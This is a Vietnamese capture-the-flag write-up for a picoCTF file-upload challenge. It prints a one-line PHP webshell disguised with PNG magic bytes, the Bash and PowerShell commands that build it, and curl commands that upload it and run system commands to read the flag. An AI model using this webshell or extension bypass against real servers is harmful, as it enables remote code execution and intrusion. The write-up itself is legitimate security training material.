# 📄 Challenge Writeup: File Upload RCE – picoCTF

## 🧠 Mục tiêu
Upload một **webshell** giả dạng file `.png`, rồi thực thi lệnh hệ thống để lấy flag.

---

## 🔍 Recon

Truy cập địa chỉ challenge:
```
http://atlas.picoctf.net:PORT/
```

Giao diện đơn giản cho phép **upload file ảnh** (`.png`).  
Nếu upload sai định dạng → báo lỗi:
```
Error: File name does not contain '.png'
```

---

## 🧪 Ý tưởng khai thác
1. Upload **PHP shell** nhưng **tên file có đuôi `.png`**
2. Bypass kiểm tra extension → server chỉ check tên file.
3. Thêm **magic bytes PNG** đầu file để qua mặt check MIME (nếu có).
4. Truy cập file shell để thực thi lệnh qua `?cmd=`

---

## 🛠️ Tạo Webshell PNG

### 1. Tạo file `shell.php`
```php
<?php system($_GET['cmd']); ?>
```

### 2. Thêm header PNG để ngụy trang

#### PowerShell (Windows)
```powershell
[System.IO.File]::WriteAllBytes("shell.php.png", @(0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A))
Get-Content shell.php -Raw | Out-File -Append -Encoding ASCII shell.php.png
```

#### Bash (Linux)
```bash
echo -ne '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.php.png
cat shell.php >> shell.php.png
```

---

## 📤 Upload File

Dùng Burp Suite hoặc curl:
```bash
curl -F 'file=@shell.php.png' http://atlas.picoctf.net:PORT/
```

Khi thành công → file được lưu tại `/uploads/shell.php.png`

---

## 🧨 RCE (Command Execution)

Truy cập shell:
```bash
curl "http://atlas.picoctf.net:PORT/uploads/shell.php.png?cmd=whoami"
```

Test `ls`, `pwd`, `cat`:
```bash
curl "http://atlas.picoctf.net:PORT/uploads/shell.php.png?cmd=ls+.."
curl "http://atlas.picoctf.net:PORT/uploads/shell.php.png?cmd=cat+../MFRDAZLDMUYDG.txt"
```

---

## 🏁 Flag

Kết quả:
```
Là gì thì tự tìm đi nhen
```

---

## 📚 Tổng kết

| Bước | Nội dung |
|------|----------|
| 1️⃣ | Khảo sát upload |
| 2️⃣ | Ngụy trang file shell với PNG header |
| 3️⃣ | Upload thành công `.php.png` |
| 4️⃣ | Truy cập URL với `?cmd=` để RCE |
| 5️⃣ | Di chuyển thư mục, `cat` file để lấy flag |